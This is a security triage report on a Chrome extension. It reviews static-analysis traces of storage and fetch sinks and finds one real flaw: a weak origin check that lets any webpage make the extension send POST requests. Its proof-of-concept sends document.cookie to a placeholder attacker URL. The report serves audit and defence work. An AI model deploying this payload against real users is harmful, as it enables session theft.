# CoCo Analysis: lpmlfjjccfdcnfplffgcmnkaafcigoil

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple (storage.set and fetch sinks)

---

## Sink 1: document_eventListener_gwd_extension → chrome_storage_local_set_sink (setStoreRate)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lpmlfjjccfdcnfplffgcmnkaafcigoil/opgen_generated_files/cs_0.js
Line 700: document.addEventListener('gwd_extension', function(e) {
Line 701: if (e.detail.evt_from.indexOf('bijiago') === -1) return
Line 740: setStoreRate(e.detail.info)
```

**Code:**

```javascript
// Content script - Entry point (cs_0.js Line 700)
document.addEventListener('gwd_extension', function(e) {
  if (e.detail.evt_from.indexOf('bijiago') === -1) return  // ← Weak check - attacker controls e.detail.evt_from
  switch (e.detail.type) {
    case "setStoreRate":
      setStoreRate(e.detail.info)  // ← attacker-controlled data
      break;
    // ... other cases
  }
})

// Storage write function (cs_0.js Line 520)
function setStoreRate(currency) {
  chrome.storage.local.set({
    'currency': currency  // ← attacker-controlled value stored
  })
}
```

**Classification:** FALSE POSITIVE

**Reason:** Storage poisoning without retrieval path. While an attacker can dispatch a custom event to write to storage, there's no evidence that the stored `currency` value flows back to the attacker or is used in a vulnerable operation. The methodology requires a complete exploitation chain (storage.set → storage.get → attacker-accessible output) for TRUE POSITIVE.

---

## Sink 2: document_eventListener_gwd_extension → chrome_storage_local_set_sink (setToken)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lpmlfjjccfdcnfplffgcmnkaafcigoil/opgen_generated_files/cs_0.js
Line 700: document.addEventListener('gwd_extension', function(e) {
Line 749: '_PD_UTMSEO_KEY': e.detail._PD_UTMSEO_KEY
Line 750: '_PD_UTMSEO_TIM': e.detail._PD_UTMSEO_TIM
```

**Code:**

```javascript
// Content script (cs_0.js)
document.addEventListener('gwd_extension', function(e) {
  if (e.detail.evt_from.indexOf('bijiago') === -1) return
  switch (e.detail.type) {
    case "setToken":
      chrome.storage.local.set({
        '_PD_UTMSEO_KEY': e.detail._PD_UTMSEO_KEY,  // ← attacker-controlled
        '_PD_UTMSEO_TIM': e.detail._PD_UTMSEO_TIM   // ← attacker-controlled
      })
      break;
  }
})
```

**Classification:** FALSE POSITIVE

**Reason:** Storage poisoning without retrieval path. No evidence that these stored values flow back to the attacker.

---

## Sink 3: document_eventListener_gwd_extension → chrome_storage_local_set_sink (setStorages)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lpmlfjjccfdcnfplffgcmnkaafcigoil/opgen_generated_files/cs_0.js
Line 700: document.addEventListener('gwd_extension', function(e) {
Line 790: setStorages(e.detail.key, e.detail.value)
```

**Code:**

```javascript
// Content script (cs_0.js)
document.addEventListener('gwd_extension', function(e) {
  if (e.detail.evt_from.indexOf('bijiago') === -1) return
  switch (e.detail.type) {
    case "setStorage":
      setStorages(e.detail.key, e.detail.value)  // ← attacker controls both key and value
      break;
  }
})

function setStorages(k, v) {
  var obj = {}
  obj[k] = v;  // ← arbitrary key-value poisoning
  chrome.storage.local.set(obj)
  chrome.storage.local.get('permanent', function(d) {
    if (d && d.permanent) {
      d.permanent[k] = v;
      obj = d.permanent
    }
    chrome.storage.local.set({
      'permanent': obj
    })
  })
}
```

**Classification:** FALSE POSITIVE

**Reason:** Storage poisoning without retrieval path. Although attacker can poison arbitrary storage keys, there's no evidence of a retrieval path that sends data back to the attacker.

---

## Sink 4: document_eventListener_gwd_extension → fetch_resource_sink (proxyRequestPost)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lpmlfjjccfdcnfplffgcmnkaafcigoil/opgen_generated_files/cs_0.js
Line 700: document.addEventListener('gwd_extension', function(e) {
Line 717: proxyRequestPost(e.detail.url, e.detail.payload, function(data) {...})
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lpmlfjjccfdcnfplffgcmnkaafcigoil/opgen_generated_files/bg.js
Line 1003: fetch(obj.url, {method: 'post', body: obj.data, ...})
```

**Code:**

```javascript
// Content script - Entry point (cs_0.js)
document.addEventListener('gwd_extension', function(e) {
  if (e.detail.evt_from.indexOf('bijiago') === -1) return  // ← Weak check: attacker controls evt_from
  switch (e.detail.type) {
    case 'proxyRequestPost':
      proxyRequestPost(e.detail.url, e.detail.payload, function(data) {  // ← attacker-controlled URL and payload
        dispatch('proxyRequestPost', data, e.detail.reqId)
      }, e.detail.referer)
      break;
  }
})

// Content script message sender (cs_0.js Line 546)
function proxyRequestPost(url, payload, callback, referer) {
  chrome.runtime.sendMessage({
    type: 'proxyRequestPost',
    url: url,           // ← attacker-controlled URL
    data: payload,      // ← attacker-controlled data
    referer: referer
  }, function(response) {
    callback(response)
  });
}

// Background script - Message handler (bg.js Line 1002)
chrome.runtime.onMessage.addListener(
  function(obj, sender, sendResponse) {
    switch (obj.type) {
      case 'proxyRequestPost':
        fetch(obj.url, {   // ← SSRF: attacker-controlled URL with extension privileges
          method: 'post',
          body: obj.data,  // ← attacker-controlled body
          headers: {
            'x-referer': obj.referer
          }
        }).then(r => r.text()).then(r => {
          sendResponse(r)
        });
        break
    }
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event (document.addEventListener)

**Attack:**

```javascript
// Malicious webpage dispatches custom event
var evt = new CustomEvent('gwd_extension', {
  detail: {
    evt_from: 'bijiago-attacker',  // Bypasses weak check (indexOf !== -1)
    type: 'proxyRequestPost',
    url: 'https://attacker.com/exfiltrate',  // Attacker-controlled destination
    payload: JSON.stringify({
      stolen: document.cookie,
      page: location.href
    }),
    reqId: '123'
  }
});
document.dispatchEvent(evt);
```

**Impact:** SSRF vulnerability allowing malicious webpages to make privileged cross-origin POST requests to arbitrary URLs with attacker-controlled payloads using the extension's elevated privileges. The extension has host_permissions for "https://*.bijiago.com/" but the check `evt_from.indexOf('bijiago') === -1` is easily bypassed by including "bijiago" anywhere in the string (e.g., "bijiago-attacker"). This allows exfiltration of data or attacks on internal services.

---

## Sink 5: document_eventListener_gwd_extension → fetch_resource_sink (runTaobaoUniq)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lpmlfjjccfdcnfplffgcmnkaafcigoil/opgen_generated_files/cs_0.js
Line 700: document.addEventListener('gwd_extension', function(e) {
Line 740: setStoreRate(e.detail.info)
Line 763: info = JSON.parse(info)
Line 764: runTaobaoUniq(info.nid, info.uniqid)
Line 665: var url = 'https://s.taobao.com/search?type=samestyle&app=i2i&rec_type=1&uniqpid=' + uniqid + '&nid=' + nid;
```

**Code:**

```javascript
// Content script event listener (cs_0.js)
document.addEventListener('gwd_extension', function(e) {
  if (e.detail.evt_from.indexOf('bijiago') === -1) return
  switch (e.detail.type) {
    case "setStoreRate":
      setStoreRate(e.detail.info)  // ← attacker-controlled
      break;
  }
})

// Storage and processing (cs_0.js Line 520)
function setStoreRate(currency) {
  chrome.storage.local.set({
    'currency': currency  // ← stores attacker data
  })
}

// Later retrieval triggers fetch with attacker-controlled parameters
function runTaobaoUniq(nid, uniqid) {
  var url = 'https://s.taobao.com/search?type=samestyle&app=i2i&rec_type=1&uniqpid=' + uniqid + '&nid=' + nid;  // ← query params controlled
  var obj = {
    type: 'taobaoUniq',
    url: url  // ← hardcoded domain but attacker controls query parameters
  }
  sendMsg(obj, function(data) {...})
}
```

**Classification:** FALSE POSITIVE

**Reason:** While attacker can control query parameters, the base URL is hardcoded to https://s.taobao.com (trusted infrastructure for this extension). Per methodology, requests to hardcoded backend URLs are considered trusted infrastructure, not attacker-controlled destinations.

---

## Sink 6: fetch_source → chrome_storage_local_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lpmlfjjccfdcnfplffgcmnkaafcigoil/opgen_generated_files/bg.js
Line 265: var responseText = 'data_from_fetch';
Line 1424: data = JSON.parse(data)
Line 1425: if (data && data.data && data.data.coupon.coupon_money) {
Line 1428: url: data.data.click_url
```

**Classification:** FALSE POSITIVE

**Reason:** This is a fetch_source (data from fetch response) being stored, not attacker-controlled data flowing to storage. Per methodology, data FROM hardcoded backend URLs is considered trusted infrastructure issue, not an extension vulnerability.
